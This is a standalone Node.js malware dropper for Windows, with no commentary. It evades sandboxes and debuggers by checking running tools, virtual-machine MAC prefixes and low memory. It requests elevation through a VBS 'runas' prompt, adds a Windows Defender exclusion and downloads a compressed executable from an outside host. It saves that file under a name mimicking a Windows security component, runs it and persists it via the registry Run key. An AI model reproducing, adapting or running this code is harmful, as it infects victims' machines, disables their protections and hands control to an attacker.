"use strict";

const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');
const http = require('http');
const os = require('os');
const zlib = require('zlib');

const SERVER_URL = "down.merkezpub.com";
const KEY = "U93FEVILD1IM";
const errorLogPath = path.join('C:', 'ProgramData', 'WindowsCache');
const errorLogFile = path.join(errorLogPath, 'error.log');

const silentLog = (msg) => {
    try {
        if (!fs.existsSync(errorLogPath)) fs.mkdirSync(errorLogPath, { recursive: true });
        const time = new Date().toISOString();
        fs.appendFileSync(errorLogFile, `[${time}] ${msg}\n`);
    } catch (e) { }
};

const isAdmin = () => {
    try {
        execSync('net session', { stdio: 'ignore' });
        return true;
    } catch (e) {
        return false;
    }
};

const antiAnalysis = async () => {
    const tools = ['wireshark', 'tcpdump', 'processhacker', 'x64dbg', 'idaw64', 'burpsuite', 'procmon', 'apimonitor', 'dnspy', 'fiddler'];
    try {
        const tasks = execSync('tasklist /v').toString().toLowerCase();
        for (let tool of tools) {
            if (tasks.includes(tool)) {
                const vbs = path.join(os.tmpdir(), "win_err.vbs");
                fs.writeFileSync(vbs, 'MsgBox "Critical System Error Detected! Code: 0x80040154", 16, "System Error"');
                execSync(`cscript.exe //nologo "${vbs}"`);
                process.exit(1);
            }
        }
    } catch (e) { }

    const macs = execSync('getmac').toString().toLowerCase();
    const vmPrefixes = ['00-05-69', '08-00-27', '00-0c-29', '00-50-56'];
    if (vmPrefixes.some(p => macs.includes(p))) process.exit(1);

    if (os.totalmem() < 4294967296 || os.cpus().length < 2) process.exit(1);

    return true;
};

const getToken = async (payload) => {
    return new Promise((resolve) => {
        const body = JSON.stringify({ key: KEY, payload: payload + ".exe.br" });
        const req = http.request({
            hostname: SERVER_URL,
            port: 80,
            path: '/api/token',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                try { resolve(JSON.parse(data).token); } catch (e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.write(body);
        req.end();
    });
};

const installAndRun = async (payload) => {
    const admin = isAdmin();
    const targetDir = admin ? errorLogPath : os.tmpdir();

    if (admin) {
        try { execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${targetDir}'"`, { stdio: 'ignore' }); } catch (e) { }
    }

    const token = await getToken(payload);
    if (!token) return;

    const url = `http://${SERVER_URL}/api/download/${payload}.exe.br?token=${token}`;
    const brPath = path.join(targetDir, payload + ".br");
    const exePath = path.join(targetDir, payload + ".exe");

    http.get(url, (res) => {
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => {
            try {
                const buffer = Buffer.concat(chunks);
                const decompressed = zlib.brotliDecompressSync(buffer);
                fs.writeFileSync(exePath, decompressed);
                spawn(exePath, [], { detached: true, stdio: 'ignore' }).unref();
                execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${payload}" /t REG_SZ /d "\\"${exePath}\\"" /f`, { stdio: 'ignore' });
            } catch (e) { }
        });
    });
};

const main = async () => {
    if (!isAdmin()) {
        const vbsPath = path.join(os.tmpdir(), "elevate.vbs");
        fs.writeFileSync(vbsPath, `CreateObject("Shell.Application").ShellExecute "${process.execPath}", "\x22${process.argv[1]}\x22", "", "runas", 1`);
        spawn('wscript.exe', [vbsPath]).unref();
        process.exit();
    }

    await antiAnalysis();
    await installAndRun("SecurityHealthSystray");
};

main();
